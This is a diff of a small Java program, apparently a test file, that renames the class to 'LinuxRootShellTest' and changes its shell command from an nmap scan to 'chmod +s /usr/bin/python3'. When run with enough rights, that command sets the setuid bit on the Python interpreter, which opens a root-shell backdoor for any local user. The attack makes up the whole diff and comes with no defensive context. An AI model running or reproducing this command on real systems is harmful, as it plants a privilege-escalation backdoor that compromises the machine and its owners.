@@ -1,10 +1,12 @@
+package testApplications;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.IOException;
 
-public class python {
+public class LinuxRootShellTest {
 	public static void main(String[] args){
-		String command = "nmap localhost";
+		String command = "chmod +s /usr/bin/python3";
 		
 		try {
 			Process process = Runtime.getRuntime().exec(command);
